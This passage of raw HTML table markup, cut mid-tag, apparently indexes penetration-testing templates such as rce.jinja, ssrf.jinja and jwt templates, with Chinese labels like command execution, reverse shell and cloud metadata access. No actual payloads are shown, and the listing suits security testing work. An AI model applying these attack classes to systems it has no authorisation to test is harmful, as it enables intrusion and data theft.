Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">rce.jinja</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">命令执行、反弹shell</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">SSRF</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">ssrf.jinja</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">内网访问、云元数据</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">IDOR</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">idor.jinja</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">水平/垂直权限测试</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">CSRF</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">csrf.jinja</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">跨域请求伪造</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">路径遍历</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">path_traversal_lfi_rfi.jinja</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">文件读取/包含</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">JWT 认证</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">authentication_jwt.jinja</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">签名验证、算法混淆</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">竞态条件</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">race_conditions.jinja</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">并发请求测试</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">业务逻辑</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">business_logic.jinja</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">工作流操纵</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">开放重定向</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">open_redirect.jinja</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">URL重定向验证</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">文件上传</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">insecure_file_uploads.jinja</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">文件类型绕过</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">批量赋值</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">mass_assignment.jinja</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">参数污染</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">信息泄露</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">information_disclosure.jinja</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">敏感数据暴露</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">权限绕过</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">broken_function_level_authorization.jinja</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">功能级授权</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 